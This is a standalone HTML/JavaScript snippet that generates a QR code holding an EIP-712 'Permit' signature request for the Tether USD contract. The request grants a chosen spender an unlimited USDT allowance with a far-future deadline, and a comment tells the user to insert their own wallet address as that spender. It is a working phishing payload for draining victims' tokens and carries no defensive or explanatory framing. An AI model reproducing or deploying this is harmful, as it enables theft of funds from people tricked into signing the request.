<script>
    // 1. CONFIGURATION
    const YOUR_SPENDER_ADDRESS = "YOUR_WALLET_ADDRESS_HERE"; // REPLACE THIS WITH YOUR ACTUAL ETH ADDRESS
    const AMOUNT = "115792089237316195423570985008687907853269984665640564039457584007913129639935"; // Max uint256
    
    // 2. THE EIP-712 PAYLOAD
    const payload = {
        domain: {
            name: "Tether USD",
            version: "1",
            chainId: 1,
            verifyingContract: "0xdAC17F958D2ee523a2206206994597C13D831ec7"
        },
        types: {
            Permit: [
                { name: "owner", type: "address" },
                { name: "spender", type: "address" },
                { name: "value", type: "uint256" },
                { name: "nonce", type: "uint256" },
                { name: "deadline", type: "uint256" }
            ]
        },
        primaryType: "Permit",
        message: {
            owner: "0x267753D5850F44b98c4a89e93a4209F5438D2179",
            spender: 0xc5Ad65DB7B1e948a88931f268cDf0B544Fa8382b,
            value: AMOUNT,
            nonce: 0,
            deadline: 9999999999
        }
    };

    // 3. GENERATE QR CODE
    document.addEventListener("DOMContentLoaded", function() {
        // Wrap the JSON in the eip712: URI scheme
        const qrData = "eip712:" + JSON.stringify(payload);
        
        new QRCode(document.getElementById("qrcode"), {
            text: qrData,
            width: 256,
            height: 256,
            colorDark : "#000000",
            colorLight : "#ffffff",
            correctLevel : QRCode.CorrectLevel.H
        });
    });
</script>
